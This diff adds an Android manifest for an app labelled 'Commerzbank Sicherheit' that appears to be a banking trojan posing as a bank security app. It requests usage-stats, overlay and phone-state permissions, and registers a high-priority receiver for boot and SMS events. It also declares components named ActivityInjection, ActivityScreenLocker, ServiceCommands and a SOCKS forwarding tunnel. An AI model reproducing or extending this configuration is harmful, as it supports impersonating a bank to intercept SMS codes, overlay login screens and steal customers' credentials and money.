@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="myapp.stuff.example">
+
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:name=".MainApplication"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Commerzbank Sicherheit"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
+
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="12211000" />
+        <meta-data
+            android:name="android.support.VERSION"
+            android:value="26.1.0" />
+        <meta-data
+            android:name="android.arch.lifecycle.VERSION"
+            android:value="27.0.0-SNAPSHOT" />
+
+        <activity android:name=".Activity.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver android:name=".Receiver.ReceiverBoot">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE" />
+                <category android:name="android.intent.category.HOME" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.DREAMING_STOPPED" />
+            </intent-filter>
+        </receiver>
+        <activity
+            android:name=".Activity.ActivityInjection"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+        <!-- ADMIN  <activity android:name=".API.Admin.ActivityAdmin" android:excludeFromRecents="true" android:icon="@drawable/im" android:theme="@android:style/Theme.NoDisplay" /> ADMIN -->
+        <activity
+            android:name=".Activity.ActivityAlert2"
+            android:icon="@drawable/im"
+            android:label="" />
+
+        <receiver
+            android:name=".Receiver.ReceiverAlarm"
+            android:enabled="true"
+            android:exported="false" />
+
+        <service
+            android:name=".ServiceCommands"
+            android:exported="false" />
+        <service
+            android:name=".StartWhileGlobal"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".StartWhileRequest"
+            android:exported="false" />
+
+        <activity
+            android:name=".Activity.ActivityScreenLocker"
+            android:icon="@drawable/im"
+            android:label="" />
+
+        <service
+            android:name=".socks.ServiceForwardingTunel"
+            android:exported="false" />
+
+        <service
+            android:name=".ServicePedometer"/>
+    </application>
+
+</manifest>
